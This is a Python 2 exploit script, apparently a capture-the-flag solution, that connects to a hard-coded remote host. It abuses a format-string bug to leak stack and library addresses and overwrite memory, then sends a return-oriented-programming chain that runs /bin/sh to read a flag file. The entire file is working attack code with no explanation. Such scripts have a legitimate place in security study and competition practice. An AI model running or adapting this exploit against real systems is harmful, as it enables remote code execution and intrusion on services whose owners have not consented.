import socket
from struct import *

recvflag = True
def go(s,payload=''):
    global recvflag
    if recvflag:
	st.recv(4096)
    s += 'A'*(128-len(payload)-len(s)) + payload
    st.send(s)
    r = st.recv(4096)
    recvflag = True
    if 'msg?' in r:
        recvflag = False
    return r

st = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
st.connect(('109.233.61.11',3129))
st.recv(4096)
st.send('letmein\n')

ret = int(go('%82$x.').split('.')[0],16)
ebp = int(go('%113$x.').split('.')[0],16)-0x9c
#base = unpack('<I',go('%16$s...'+pack('<I',ebp-0x14c))[0:4])[0]-0xbb8
base = ret+0x1bab2d
print 'ret =',hex(ret)
print 'ebp =',hex(ebp)
print 'base = ',hex(base)
func_read = base-0xf5c60

v6 = int(go('%78$x.').split('.')[0],16)
print 'v6 =',hex(v6)

payload = 'A'*16+'read'+'rett'+'0000'+pack('<I',ebp+0xc)+'\x01\x01\x01'
go('%%%dc'%(133+len(payload)),payload)

payload = 'A'*16+'read'+'rett'+'000'
go('%%%dc'%(133+len(payload)),payload)

payload = 'A'*16+'read'+'rett'+'00'
go('%%%dc'%(133+len(payload)),payload)

payload = 'A'*16+'read'+'rett'+'0'
go('%%%dc'%(133+len(payload)),payload)

payload = 'A'*16+'read'+'rett'
go('%%%dc'%(133+len(payload)),payload)

payload = pack('<I',v6+1)+'AAAABBBBAAAA'+\
	pack('<I',func_read)+\
        pack('<I',ret+0xab6c)
go('%%%dc'%(133+len(payload)),payload)
go('%133c')

if recvflag:
    st.recv(4096)
st.send('n')

payload = pack('<I',0x0b)+\
	pack('<I',base+0x711)+\
	pack('<I',ebp+0x28)+\
	pack('<I',ret+0x14aa8)+\
	pack('<I',ebp+0x30)+\
	pack('<I',ebp+0x3c)+\
	pack('<I',ret+0x14db2)+\
	'/bin/sh\x00'+\
	pack('<I',ebp+0x28)+\
	pack('<I',ebp+0x40)+\
	pack('<I',ebp+0x44)+\
	'\x00\x00\x00\x00'+\
	'-c\x00\x00'+\
	'cat flag'
st.send(payload)
print st.recv(4096)


